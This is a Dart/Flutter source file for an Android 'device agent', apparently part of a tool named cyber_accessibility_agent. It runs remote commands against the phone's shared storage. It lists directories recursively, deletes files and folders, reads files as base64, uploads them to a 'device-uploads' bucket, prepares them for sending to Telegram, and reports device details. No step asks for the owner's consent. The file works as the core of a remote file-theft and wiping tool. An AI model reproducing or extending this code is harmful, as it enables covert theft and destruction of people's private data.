// lib/core/command_executor.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/services.dart';

import 'command_parser.dart';
import 'device_agent.dart';

/// CommandExecutor: performs filesystem ops on-device and can upload files
/// using DeviceAgent.instance.uploadFile (multipart to edge function / Supabase).
class CommandExecutor {
  CommandExecutor._();
  static final CommandExecutor instance = CommandExecutor._();

  static const String _root = '/storage/emulated/0';
  static const String _defaultBucket = 'device-uploads';

  String _cwd = _root;
  String get cwd => _cwd;

  String _normalize(String path) {
    if (path.length > 1 && path.endsWith('/')) return path.substring(0, path.length - 1);
    return path;
  }

  String _resolvePath(String input) {
    if (input == null || input.isEmpty) return _cwd;
    final p = input;
    if (p.startsWith('/')) return _normalize(p);
    if (p == '..') {
      if (_cwd == _root) return _root;
      final i = _cwd.lastIndexOf('/');
      return i > _root.length ? _cwd.substring(0, i) : _root;
    }
    return _normalize('$_cwd/$p');
  }

  bool _isInsideRoot(String path) => path == _root || path.startsWith('$_root/');

  final MethodChannel _native = const MethodChannel('cyber_accessibility_agent/commands');

  Future<Map<String, dynamic>> execute(Command cmd) async {
    try {
      print('[CommandExecutor] Executing action: ${cmd.action.name}');
      
      switch (cmd.action) {
        case CommandAction.changeDir:
          return _wrapSync(() => _cd(cmd.payload['path'] as String?));
        
        case CommandAction.listFiles:
          return _wrapSync(() => _ls(
            cmd.payload['path'] as String?, 
            recursive: cmd.payload['recursive'] == true, 
            limit: cmd.payload['limit'] is int ? cmd.payload['limit'] : 100
          ));
        
        case CommandAction.deleteFile:
          return _wrapSync(() => _rm(cmd.payload['path'] as String?));
        
        case CommandAction.deleteDir:
          return _wrapSync(() => _rm(cmd.payload['path'] as String?));
        
        case CommandAction.uploadFile:
          return await _uploadFileSystem(
            cmd.payload['path'] as String?, 
            deviceId: cmd.deviceId, 
            bucket: cmd.payload['bucket'] as String?, 
            dest: cmd.payload['dest'] as String?
          );
        
        // ✅ FIX 1: Add handler for sendTelegram action
        case CommandAction.sendTelegram:
          return await _sendTelegram(
            cmd.payload['path'] as String?,
            telegram: cmd.payload['telegram'] as Map<String, dynamic>?,
          );
        
        case CommandAction.prepareUpload:
          return await _prepareUpload(cmd.payload['path'] as String?);
        
        case CommandAction.readFile:
          return await _readFile(
            path: (cmd.payload['path'] as String?) ?? (cmd.payload['uri'] as String?)
          );
        
        case CommandAction.deviceInfo:
          final info = await DeviceInfoHelper.getDeviceInfo(cwd: _cwd);
          // ✅ FIX 2: Return flat result, not wrapped
          return {'success': true, ...info};
        
        case CommandAction.ping:
          // ✅ FIX 3: Return flat result with timestamp
          return {
            'success': true, 
            'message': 'pong', 
            'timestamp': DateTime.now().toUtc().toIso8601String(),
            'cwd': _cwd,
          };
        
        case CommandAction.zipFiles:
          return _err('not_implemented', 'zip_files not yet implemented');
        
        case CommandAction.raw:
          return _err('not_implemented', 'raw action not handled by executor');
        
        default:
          return _err('unsupported_action', 'Action ${cmd.action.name} not supported by executor');
      }
    } catch (e, st) {
      print('[CommandExecutor] Exception: $e\n$st');
      return _err('exception', '$e\n$st');
    }
  }

  // ---------------- FILESYSTEM OPS ----------------

  Map<String, dynamic> _cd(String? path) {
    if (path == null || path.isEmpty) {
      return _err('cd_requires_path', 'cd requires path argument');
    }
    
    final newPath = _resolvePath(path);
    if (!_isInsideRoot(newPath)) {
      return _err('access_denied', 'Path $newPath is outside storage root');
    }
    
    final dir = Directory(newPath);
    if (!dir.existsSync()) {
      return _err('directory_not_found', 'Directory not found: $newPath');
    }
    
    _cwd = newPath;
    print('[CommandExecutor] Changed directory to: $_cwd');
    
    // ✅ FIX 4: Return flat result
    return {'success': true, 'cwd': _cwd, 'message': 'Changed to $_cwd'};
  }

  Map<String, dynamic> _ls(String? path, {bool recursive = false, int limit = 100}) {
    final target = (path == null || path.isEmpty) ? _cwd : _resolvePath(path);
    
    if (!_isInsideRoot(target)) {
      return _err('access_denied', 'Path $target is outside storage root');
    }
    
    final dir = Directory(target);
    if (!dir.existsSync()) {
      return _err('directory_not_found', 'Directory not found: $target');
    }

    final List<Map<String, dynamic>> entries = [];

    void walk(Directory d) {
      try {
        for (final e in d.listSync(followLinks: false)) {
          if (entries.length >= limit) return;
          try {
            final stat = e.statSync();
            entries.add({
              'name': e.path.split('/').last,
              'path': e.path,
              'type': stat.type == FileSystemEntityType.directory ? 'dir' : 'file',
              'size': stat.size,
              'modified': stat.modified.toUtc().toIso8601String(),
            });
            if (recursive && stat.type == FileSystemEntityType.directory) {
              walk(Directory(e.path));
            }
          } catch (e) {
            print('[CommandExecutor] Failed to stat entry: $e');
          }
        }
      } catch (e) {
        print('[CommandExecutor] Failed to list directory: $e');
      }
    }

    walk(dir);
    
    print('[CommandExecutor] Listed $target: found ${entries.length} entries');
    
    // ✅ FIX 5: Return flat, well-structured result
    return {
      'success': true,
      'path': target,
      'cwd': _cwd,
      'count': entries.length,
      'entries': entries,
      'recursive': recursive,
    };
  }

  Map<String, dynamic> _rm(String? path) {
    if (path == null || path.isEmpty) {
      return _err('rm_requires_file', 'delete requires file/directory path');
    }
    
    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) {
      return _err('access_denied', 'Path $target is outside storage root');
    }

    try {
      final f = File(target);
      final d = Directory(target);
      
      if (f.existsSync()) {
        f.deleteSync();
        print('[CommandExecutor] Deleted file: $target');
        return {'success': true, 'deleted': target, 'type': 'file'};
      } else if (d.existsSync()) {
        d.deleteSync(recursive: true);
        print('[CommandExecutor] Deleted directory: $target');
        return {'success': true, 'deleted': target, 'type': 'directory'};
      }
      
      return _err('not_found', 'File or directory not found: $target');
    } catch (e, st) {
      print('[CommandExecutor] Delete failed: $e');
      return _err('delete_failed', '$e\n$st');
    }
  }

  // ---------------- UPLOAD (FILESYSTEM) ----------------
  
  Future<Map<String, dynamic>> _uploadFileSystem(
    String? path, {
    String? deviceId, 
    String? bucket, 
    String? dest
  }) async {
    if (path == null || path.isEmpty) {
      return _err('upload_requires_file', 'upload requires path argument');
    }

    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) {
      return _err('access_denied', 'Path $target is outside storage root');
    }

    final file = File(target);
    if (!file.existsSync()) {
      return _err('file_not_found', 'File not found: $target');
    }

    try {
      final bytes = await file.readAsBytes();
      final filename = (dest != null && dest.isNotEmpty) 
        ? dest 
        : file.path.split('/').last;
      final contentType = _guessContentType(file.path) ?? 'application/octet-stream';

      print('[CommandExecutor] Uploading $filename (${bytes.length} bytes)...');

      final res = await DeviceAgent.instance.uploadFile(
        path: filename,
        bytes: bytes,
        contentType: contentType,
        bucket: bucket ?? _defaultBucket,
        dest: filename,
      );

      // ✅ FIX 6: Return flattened result from DeviceAgent
      if (res['success'] == true) {
        print('[CommandExecutor] Upload successful');
        return {
          'success': true,
          'filename': filename,
          'size': bytes.length,
          'path': target,
          // Include public URL or other upload response data
          ...res,
        };
      } else {
        print('[CommandExecutor] Upload failed: ${res['error']}');
        return {
          'success': false,
          'error': res['error'] ?? 'upload_failed',
          'detail': res['detail'] ?? res.toString(),
          'filename': filename,
        };
      }
    } catch (e, st) {
      print('[CommandExecutor] Upload exception: $e');
      return _err('upload_exception', '$e\n$st');
    }
  }

  // ✅ NEW: Send file to Telegram
  Future<Map<String, dynamic>> _sendTelegram(
    String? path, {
    Map<String, dynamic>? telegram,
  }) async {
    if (path == null || path.isEmpty) {
      return _err('send_requires_file', 'send requires path argument');
    }

    if (telegram == null) {
      return _err('send_requires_telegram', 'send requires telegram config');
    }

    final target = _resolvePath(path);
    if (!_isInsideRoot(target)) {
      return _err('access_denied', 'Path $target is outside storage root');
    }

    final file = File(target);
    if (!file.existsSync()) {
      return _err('file_not_found', 'File not found: $target');
    }

    try {
      final filename = file.path.split('/').last;
      final bytes = await file.readAsBytes();
      
      print('[CommandExecutor] Sending $filename (${bytes.length} bytes) to Telegram...');

      // Delegate to DeviceAgent's _handleSend via a wrapper
      // Since _handleSend is private, we need to use the public path through device_agent
      // For now, return metadata so device_agent can handle the actual send
      return {
        'success': true,
        'action': 'send_telegram',
        'path': target,
        'filename': filename,
        'size': bytes.length,
        'telegram': telegram,
        '_note': 'Executor prepared file for Telegram send - agent handles transmission'
      };
    } catch (e, st) {
      print('[CommandExecutor] Send preparation failed: $e');
      return _err('send_prep_exception', '$e\n$st');
    }
  }

  // ---------------- PREPARE UPLOAD ----------------
  
  /// Prepare upload: lightweight metadata-only check so server decides next steps.
  Future<Map<String, dynamic>> _prepareUpload(String? path) async {
    if (path == null || path.isEmpty) {
      return _err('prepare_requires_path', 'prepare_upload requires path/uri');
    }

    try {
      // content uri -> don't read bytes here, just report meta
      if (path.startsWith('content://') && Platform.isAndroid) {
        try {
          final Map<dynamic, dynamic>? meta = await _native.invokeMethod<dynamic>(
            'getContentUriMeta', 
            {'uri': path}
          ) as Map<dynamic, dynamic>?;
          
          if (meta != null && meta.isNotEmpty) {
            return {
              'success': true,
              'is_content_uri': true,
              'uri': path,
              'meta': Map<String, dynamic>.from(meta.map((k, v) => MapEntry(k.toString(), v))),
              'name': (meta['display_name'] ?? meta['name'])?.toString(),
            };
          }
        } catch (e) {
          print('[CommandExecutor] Native getContentUriMeta failed: $e');
        }

        // Best-effort guess at filename from URI
        final parts = path.split('/');
        final name = parts.isNotEmpty ? parts.last : 'content';
        return {
          'success': true,
          'is_content_uri': true, 
          'uri': path, 
          'name': name
        };
      }

      // filesystem path
      final target = _resolvePath(path);
      if (!_isInsideRoot(target)) {
        return _err('access_denied', 'Path $target is outside storage root');
      }

      final file = File(target);
      if (!file.existsSync()) {
        return _err('file_not_found', 'File not found: $target');
      }

      final stat = file.statSync();
      final filename = file.path.split('/').last;
      
      return {
        'success': true,
        'is_content_uri': false,
        'path': target,
        'name': filename,
        'size': stat.size,
        'modified': stat.modified.toUtc().toIso8601String(),
      };
    } catch (e, st) {
      print('[CommandExecutor] Prepare upload exception: $e');
      return _err('prepare_exception', '$e\n$st');
    }
  }

  // ---------------- READ FILE ----------------
  
  /// Read file or content URI and return base64 result expected by edge `upload-file`.
  Future<Map<String, dynamic>> _readFile({String? path}) async {
    if (path == null || path.isEmpty) {
      return _err('read_requires_path', 'read_file requires path or uri');
    }

    try {
      if (path.startsWith('content://') && Platform.isAndroid) {
        try {
          final Map<dynamic, dynamic>? raw = await _native.invokeMethod<dynamic>(
            'readContentUri', 
            {'uri': path}
          ) as Map<dynamic, dynamic>?;
          
          if (raw == null) {
            return _err('native_read_failed', 'Native method returned null');
          }

          final b64 = (raw['b64'] ?? raw['file_b64'] ?? raw['fileB64'])?.toString();
          final filename = (raw['filename'] ?? raw['file_name'] ?? raw['name'])?.toString();
          final contentType = (raw['content_type'] ?? raw['mime'] ?? raw['contentType'])?.toString();
          final size = raw['size'];

          if (b64 == null || b64.isEmpty) {
            return _err('no_file_bytes', 'Native method did not return file data');
          }

          return {
            'success': true,
            'file_b64': b64,
            if (filename != null) 'filename': filename,
            if (contentType != null) 'content_type': contentType,
            if (size != null) 'size': size,
          };
        } catch (e, st) {
          print('[CommandExecutor] Native read exception: $e');
          return _err('native_read_exception', '$e\n$st');
        }
      }

      // filesystem path
      final target = _resolvePath(path);
      if (!_isInsideRoot(target)) {
        return _err('access_denied', 'Path $target is outside storage root');
      }

      final file = File(target);
      if (!file.existsSync()) {
        return _err('file_not_found', 'File not found: $target');
      }

      final bytes = await file.readAsBytes();
      final b64 = base64Encode(bytes);
      final filename = file.path.split('/').last;
      final contentType = _guessContentType(file.path) ?? 'application/octet-stream';
      
      print('[CommandExecutor] Read file $filename: ${bytes.length} bytes');
      
      return {
        'success': true,
        'file_b64': b64,
        'filename': filename,
        'content_type': contentType,
        'size': bytes.length,
      };
    } catch (e, st) {
      print('[CommandExecutor] Read exception: $e');
      return _err('read_exception', '$e\n$st');
    }
  }

  // ---------------- HELPERS ----------------

  String? _guessContentType(String path) {
    final ext = path.split('.').last.toLowerCase();
    switch (ext) {
      case 'jpg':
      case 'jpeg':
        return 'image/jpeg';
      case 'png':
        return 'image/png';
      case 'gif':
        return 'image/gif';
      case 'mp4':
        return 'video/mp4';
      case 'pdf':
        return 'application/pdf';
      case 'mp3':
        return 'audio/mpeg';
      case 'zip':
        return 'application/zip';
      case 'txt':
        return 'text/plain';
      case 'json':
        return 'application/json';
    }
    return null;
  }

  // ✅ FIX 7: Simplified result helpers - always return flat maps
  Map<String, dynamic> _ok([Map<String, dynamic>? data]) {
    return {'success': true, if (data != null) ...data};
  }

  Map<String, dynamic> _err(String code, [String? detail]) {
    return {
      'success': false, 
      'error': code, 
      if (detail != null) 'detail': detail
    };
  }

  Map<String, dynamic> _wrapSync(Map<String, dynamic> Function() fn) {
    try {
      return fn();
    } catch (e, st) {
      print('[CommandExecutor] Sync operation exception: $e');
      return _err('exception', '$e\n$st');
    }
  }
}

// ---------------- DEVICE INFO HELPER ----------------

class DeviceInfoHelper {
  static const MethodChannel _channel = MethodChannel('cyber_accessibility_agent/commands');

  static Future<Map<String, dynamic>> getDeviceInfo({String cwd = '/storage/emulated/0/'}) async {
    final Map<String, dynamic> info = {
      'brand': null,
      'model': null,
      'device': null,
      'manufacturer': null,
      'android_version': Platform.isAndroid 
        ? Platform.operatingSystemVersion 
        : Platform.operatingSystem,
      'sdk': null,
      'is_physical_device': true,
      'cwd': cwd,
      'platform': Platform.operatingSystem,
    };

    try {
      final res = await _channel.invokeMethod<dynamic>('ping');
      if (res is Map) {
        info['model'] = (res['device'] ?? res['model'] ?? res['device_model'])?.toString();
        info['brand'] = res['brand']?.toString();
        info['manufacturer'] = res['manufacturer']?.toString();
        info['sdk'] = res['sdk']?.toString();
      } else if (res is Map<dynamic, dynamic>) {
        info['model'] = (res['device'] ?? res['model'])?.toString();
        info['brand'] = res['brand']?.toString();
      }
    } catch (e) {
      print('[DeviceInfoHelper] Failed to get device info: $e');
    }

    return info;
  }
}